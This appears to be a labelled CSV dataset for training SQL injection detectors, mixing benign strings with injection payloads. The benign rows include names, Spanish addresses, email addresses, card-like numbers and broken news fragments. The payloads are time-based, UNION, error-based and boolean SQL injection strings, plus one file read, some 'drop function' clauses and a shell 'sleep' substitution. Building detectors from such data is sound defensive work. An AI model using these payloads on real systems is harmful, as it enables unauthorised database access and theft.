Sentence,Label
"1"" )  where 6843 = 6843 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",1
1152,0
"1 )  as zqxa where 5718 = 5718 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
50400,0
cehegn,0
poseidon6,0
-6947'  )  )   as qqjp where 6700 = 6700 union all select 6700#,1
"1 )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 2303 = 2303",1
1 )  where 1079 = 1079,1
tolox,0
tyner,0
18179,0
buc_falo,0
vilamartn de valdeorras,0
kjer@multibuscador.com.ph,0
-5369' )  or 3208 = 6669#,1
icahel,0
llanderal campos,0
09239,0
"-8699"" )  union all select 8645,8645,8645,8645,8645,8645--",1
"1""  )  )   as qrok where 8257 = 8257 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
1' waitfor delay '0:0:5'--,1
tropeano3,0
"1' )  where 8586 = 8586 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
chittell@agroibericaingenieros.vg,0
"1'  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  'tblb' = 'tblb",1
"1"" )  as dezr where 2145 = 2145 or sleep ( 5 ) #",1
chumbiauca,0
"isabel la catolica, 34",0
torremocha del campo,0
karina9,0
1055239425022881,0
" select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1
lyle,0
"albadalejo hijuela 76,",0
parola@zonamodelos.pl,0
"pl. sierra de ayllon 100,",0
1'  )  )   as fbjd where 8597 = 8597,1
12182,0
"calle la orotava, s/n",0
" The decision reignited painful memories Perth mother June Corteen , lost 39-year-old twin daughters Jane Jenny destruction unleashed Patek co-conspirators almost decade ago ",0
9849,0
"1' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ",1
"1'  )  )   )  union all select null,null,null,null,null,null,null,null--",1
bunn,0
-2527  )  )   as oqpy where 7468 = 7468 or 3038 = 3038,1
"1  )  )   as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
puebla de arenoso,0
odieta,0
agostina,0
" Christ born, millions minds grow cleave genius, confounded virtue possible man",0
josef,0
herrera@silver-knights.tz,0
"1"" )  where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
2146778309020113,0
"1'  )  )   as ytfi where 3323 = 3323 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1"" where 2204 = 2204 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
suchet@ciaplast.tel,0
romeu herrero,0
1 )  as fhvb where 4008 = 4008,1
"1%"" )  union all select null,null,null,null#",1
select  ( case when  ( 1227 = 4014 )  then 1227 else 1227* ( select 1227 from mysql.db )  end ) #,1
1 )  as kaew where 2658 = 2658,1
"zafiro, s/n 4?b",0
karkotsk,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( ""oiuw"" = ""oiuw",1
torterolo buix,0
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'ayjb' like 'ayjb",1
at89a7218,0
"1""  )  )   as tjdz where 8656 = 8656 union all select null,null,null,null,null--",1
 group by userid having 1 = 1--,1
timmons,0
 The appeals court said judge needed removed case ran afoul code conduct U,0
" However , theoretically , possible ",0
discoro,0
1' )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ,1
"glorieta puerta de hierro, 57",0
grelck,0
 The movement also bolstered two former U,0
5ictoriosamente,0
tuffo,0
"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
-5500' )  order by 1--,1
"calle barrio carmelo 21,",0
ptok@aou.com.th,0
" ( select  ( case when  ( 4232 = 4232 )  then  ( select benchmark ( 5000000,md5 ( 0x6b637544  )  )   )  else 4232* ( select 4232 from mysql.db )  end  )  )  ",1
nooshin,0
"1%"" and elt ( 5345 = 8751,8751 )  and ""%"" = """,1
cencier,0
" However , aware one people actually deal topic &apos; living old age &apos; ",0
elsen@whitehat.td,0
"-9959"" )  where 7073 = 7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",1
13440,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( ""khuw"" like ""khuw",1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( ""poik"" = ""poik",1
m8rrega,0
" That means one passenger line Frontier gate might get bring bag free , next person line might owe $ 100 similar bag ",0
wolfe,0
"1  )  )   as rqbo where 2243 = 2243 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
5109006060601152,0
 What certain 19-year-old female driver VW Golf driving direction Revensdorf 38-year-old man Gettorf came towards Hyundai ,0
"urbanitzacio las lomas, 18, 4a",0
30216787p,0
-3881  )  )   )  union all select 4438--,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual# gnga",1
40197,0
"c/ la miraculosa, 147",0
"1  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
5111638071636143,0
presbiteriano,0
pardos@barcafedaniss.co,0
 He said itinerary still worked ,0
brines grimalda,0
9828908323300958,0
maid,0
mandbula,0
51414020g,0
1 where 4245 = 4245,1
"1%""  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""%"" = """,1
21613516w,0
07650,0
barnhous,0
"-2423'  )  )   )  union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1
-3748' where 9292 = 9292 or 3337 = 2859#,1
41710,0
correnta,0
b5s106c3dor,0
"-1772  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  8904 = 8904",1
6849,0
ginette,0
34336341d,0
10665,0
7751,0
benalmdena,0
 It yet clear new owner use former Kindergarten ,0
stella mara,0
"1' in boolean mode )  union all select null,null,null,null,null,null,null--",1
emory,0
1al6uiria,0
32219707l,0
purgerso1,0
j0ctar,0
declare @s varchar ( 22 )  select @s  = ,1
"1'  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  'lokx' like 'lokx",1
1'+ ( select gguu where 7809 = 7809 union all select null--,1
"1%""  )  )   order by 1--",1
caada del hoyo,0
"-8364' )  union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1
choon-li,0
steelsmith@7peines.com,0
1 )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( 9505 = 9505,1
8936821736408974,0
1'+ ( select tart where 9861 = 9861,1
"1' and elt ( 4249 = 4249,7259 ) ",1
1  )  )   as emtf where 3561 = 3561 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --,1
1'+ ( select wpai where 3685 = 3685,1
d6ntrotr566,0
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
"1 )  and make_set ( 8403 = 8403,8899 ) ",1
75817612k,0
37311,0
select  ( case when  ( 9540 = 5786 )  then 9540 else 9540* ( select 9540 from information_schema.character_sets )  end ) #,1
"1""  )  )   waitfor delay '0:0:5'--",1
"-9904""  )  )   union all select 9080,9080,9080,9080,9080--",1
"-7084 )  where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",1
joseph,0
 He told FT meant agreement longer respected Frelimo ,0
arjona,0
" In case , spokesperson Israeli Ministry Defence said: &quot; We commenting reports &quot; ",0
yoe,0
3777298102533853,0
lewes,0
"1"" where 3764 = 3764",1
" select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1
iza,0
"pl. san marcial 90, 13-e",0
"select * from generate_series ( 6468,6468,case when  ( 6468 = 7999 )  then 1 else 0 end )  limit 1--",1
" Together accomplice , procured women , brought various brothels south-west ",0
1 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) # lwfs,1
paula pladellorens,0
 $ ( sleep 50 ) ,1
arcngel,0
"1""  )  )   as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
"1"" or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1
friedkin@dubi.ye,0
cejadero,0
48673442z,0
r57qu0ller3,0
atos,0
 The ice cream reacts eater &apos;s tongue - raising pH level protein making glow ,0
intuitivo,0
cortegada,0
impetratorio,0
edelweis,0
"praza pascasio fernandez seguin, 73,",0
08968667r,0
prize@lingote.com.pn,0
"1"" )  as sraw where 1997 = 1997 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
86et4ar,0
gwenny,0
exagerante,0
13g0e7at42a,0
ramells lam,0
"1%"" )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""%"" = """,1
riguier_waits3@copiar.com.gl,0
guindo vive,0
crip3gama,0
04740,0
h2lmi0to,0
"calle olivos de pea nevada, 124,",0
gorrero,0
cabaas del castillo,0
2719,0
pche,0
"-9924  )  )   as zgqa where 2867 = 2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
marcolino,0
"1' )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ",1
1 rlike sleep ( 5 ) # urxh,1
" &quot; Earlier week , inspectors said completed first round verification work , visiting 21 23 sites declared Damascus ",0
chaiman,0
"montmell, el",0
09640,0
lecuona gasull,0
vitriago iribe,0
meli portugal,0
elliman.kane@doloresmusculares.tt,0
19115,0
 Here standard private television production presented purest form ,0
callos,0
" I much prefer lower strain, genuine equal, glittering unsteady",0
dosaiges,0
7677,0
1524943090962502,0
tinti@21horas.hr,0
21520,0
birk2,0
" &quot; The meeting takes place Town Hall , center Manhattan ",0
1'|| ( select 'goen' from dual where 8586 = 8586,1
-1662 where 1119 = 1119 or  ( 8459 = 8459 ) *4906--,1
34112,0
6287,0
"-4993"" union all select 6959,6959,6959--",1
select  ( case when  ( 7019 = 1998 )  then 7019 else 7019* ( select 7019 from mysql.db )  end ) #,1
card patrn,0
if ( 9431 = 6730 )  select 9431 else drop function xbkh--,1
" But one 1966 case , known &quot; John / Joan , &quot; theories became controversial ",0
villamuelas,0
selwart@studentrooms.zr,0
"1 )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"pasaje cesar arbasia, 99, 3-a",0
nataliya,0
select  ( case when  ( 4393 = 2875 )  then 1 else 4393* ( select 4393 from master..sysdatabases )  end ) --,1
0367766571989021,0
" Jenny Slate cast member &quot; Saturday Night Live &quot; &quot; Parks Recreation , &quot; though best known viral video series &quot; Marcel Shell Shoes On ",0
"charca verde 165,",0
caabate liano,0
carola,0
goble,0
1'+ ( select rhlb where 9477 = 9477,1
" select * from users where id = 1 union select !<@,version (  )  -- 1",1
983tau027iv1,0
1'|| ( select 'hshf' where 9073 = 9073 and 7533 = 7533 ) ||',1
"1' )  where 6988 = 6988 union all select null,null,null,null,null,null,null,null--",1
desi4teresal,0
grecia,0
g53on3a9u56,0
"1%""  )  )   union all select null,null,null,null,null,null,null,null#",1
"nuestra seora del perpetuo socorro, 125",0
1'  )  )   as eymg where 7000 = 7000,1
"1%"" )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
barnhill,0
llobet garrido,0
46712,0
gardiner@enlapalma.com.tf,0
5690251194310555,0
"santa leonor, 187, 7?h",0
-7199' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'qibr' = 'qibr,1
"1'+ ( select jqyo where 4426 = 4426 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  +'",1
2561,0
"-9392  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  2975 = 2975",1
clech@ofertachina.lb,0
"calle obispo miguel bucarelli, 63",0
"c/ cadiz, 161 8?c",0
nelsen,0
alabiada,0
santa colomba de somoza,0
2754013363983769,0
"1' )  where 9381 = 9381 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
sufragio,0
1858844591273979,0
valdelagua del cerro,0
gramajo,0
lubienska@suardistec.ai,0
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'wuux' = 'wuux,1
cancia,0
cardenas_johansson@sorority.kz,0
 or '' = ',1
8i0l2,0
49649363e,0
"select sleep ( 5 )  and  ( ""%"" = """,1
"c/ de la radio 81, 7?b",0
drabek,0
inglis@baltasarsantos.vu,0
280,0
camueso,0
"1"" )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --",1
5071457093229658,0
1862612098499070,0
"c/ la magdalena 187,",0
-2817%' )  or 8255 = 3841--,1
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and 'ozur' = 'ozur",1
4,0
persaud,0
"1""  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""kvpy"" = ""kvpy",1
"1""  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( ""ilge"" like ""ilge",1
marcelin solivera,0
medina del campo,0
"-7006' where 6966 = 6966 union all select 6966,6966,6966,6966#",1
" Chairperson , Manuela Honeck , provided explanation accompany pieces ",0
stimson_holbrook@cementosanfranq.ly,0
kavaler,0
traspilla*r,0
 But fine ,0
r0326451anis81,0
06314426y,0
c/ castalia 134 12?f,0
1'|| ( select 'bsbv' from dual where 5276 = 5276 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu  )  )  ||',1
porro,0
villoresi@n340magazin.tc,0
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and 'sloy' = 'sloy",1
0esh6red32,0
godish,0
583no,0
"1"" where 5977 = 5977",1
whisler,0
1289184005344933,0
" The work exploits local features, limited capturing long range dependencies punctuation prediction",0
"1""  )  )   as cduw where 4495 = 4495",1
-8745' )  as xpwv where 8855 = 8855 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
bellprat,0
1erso,0
"1  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 5030 = 5030",1
"-9688%'  )  )   )  or elt ( 3695 = 7995,7995 )  and   (  (   ( '%' = '",1
venfica,0
degollar,0
1 )  as msat where 1267 = 1267,1
"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
4761547357229973,0
-4803%'  )  )   or 8571 = 8571--,1
"1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'",1
97233442e,0
1' in boolean mode )  and 2006 = 2006,1
22234,0
"1  )  )   )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
-3059' )  as jhbh where 4056 = 4056 or  ( 3498 = 6965 ) *6965--,1
rosngela,0
if ( 3490 = 4920 )  select 3490 else drop function hlzt--,1
' )  or  ( 'a' = 'a,1
" Meanwhile , Mr Kerry scheduled head weekend Middle East Poland address rancor U",0
boagne,0
amarilis,0
ananas,0
muriel de la fuente,0
1' )  where 8291 = 8291,1
1'  )  )   as cjjm where 1981 = 1981,1
casanellas berlingery,0
montn,0
6275892098766818,0
41100,0
1'  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'cuav' = 'cuav,1
pryor,0
ondorica arabia,0
"calle puruuela, 15 6?d",0
"-9886%'  )  )   )  union all select 5191,5191,5191,5191,5191,5191,5191--",1
1 )  as afmb where 8665 = 8665 order by 1#,1
tredway,0
orus patio,0
-7293'  )  )   )  or 3038 = 3038,1
"-7996""  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""iuzv"" like ""iuzv",1
or isNULL ( 1/0 )  /*,1
7164,0
"-5124'+ ( select 'xpww' where 1752 = 1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1
"-8144' )  where 1691 = 1691 or elt ( 7246 = 7816,7816 ) --",1
"1 )  as ghew where 6441 = 6441 union all select null,null--",1
-8812 or 6872 = 6872# dflr,1
"1'|| ( select 'goxu' where 9215 = 9215 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( 'xori' like 'xori",1
"-8981%""  )  )   )  union all select 4538,4538,4538,4538,4538,4538,4538#",1
22991,0
esbarar,0
berto,0
51,0
matsumiya stuyck,0
 One major reason upcoming price increase rise so-called EEC Levy 5,0
su9ltamente,0
rus maragliano,0
spinnell@cpanelweb.com.ao,0
"1"" )  as hsws where 6656 = 6656",1
9091453994786923,0
lebars,0
"1""  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  ""nbfe"" = ""nbfe",1
"select count ( * )  from generate_series ( 1,5000000 )  and ""ihbe"" like ""ihbe",1
jayavant,0
select  ( case when  ( 4996 = 1734 )  then 1 else 4996* ( select 4996 from master..sysdatabases )  end ) --,1
72981161e,0
"1%""  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( ""%"" = """,1
abigar,0
16926,0
3354081674154882,0
foubert,0
1'  )  )   as cyom where 2318 = 2318 and 7533 = 7533--,1
andjar,0
"1""  )  )   union all select null,null,null,null,null,null,null,null,null#",1
